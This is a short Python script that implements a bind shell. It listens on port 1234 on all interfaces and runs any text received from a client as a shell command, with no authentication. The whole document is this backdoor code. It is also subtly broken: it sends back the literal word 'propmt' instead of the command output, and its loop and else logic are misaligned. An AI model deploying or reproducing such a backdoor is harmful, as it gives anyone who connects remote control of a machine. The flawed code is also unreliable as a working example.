import socket,subprocess
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.bind(('',1234))
print("Listener:{}".format(s.getsockname()))
s.listen(1)
while True:
    connection,client_address=s.accept()
    try:
        connection.sendall(">")
        while True:
            data=connection.recv(2048)
            if data:
                comm=subprocess.Popen(data,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
            out,err=comm.communicate()
            propmt="{}{}>".format(out,err)
            connection.sendall("propmt")
        else:
             break
    finally:
       connection.close()

